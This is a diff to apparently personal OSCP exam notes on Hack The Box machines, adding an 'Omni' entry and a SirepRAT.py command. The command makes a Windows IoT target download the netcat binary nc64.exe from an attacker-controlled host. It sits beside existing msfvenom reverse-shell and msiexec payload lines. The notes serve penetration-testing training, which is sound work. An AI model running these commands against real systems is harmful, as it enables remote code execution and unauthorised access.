@@ -80,6 +80,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | *Intelligence | username(pdf creator), add AD Integrated DNS records  | group ReadGMSAPassword | :white_check_mark: |
 | Jerry | Tomcat default credential, deploy | no need ||
 | Love | SSRF Gopher MySQL | AlwaysInstallElevated ||
+| Omni | IOT exploit |
 
 (*):review before the exam
 
@@ -359,4 +360,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker po
 
 ```powershell
 msiexec /quiet /qn /i <payload>
+```
+
+Used in ```Omin```
+
+[SirepRAT.py](https://github.com/SafeBreach-Labs/SirepRAT)
+
+```
+python SirepRAT.py <target ip> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c     Powershell Invoke-WebRequest -OutFile C:\Data\Users\DefaultAccount\Documents\nc64.exe -Uri http://<attacker ip>/nc64.exe "
+
 ```
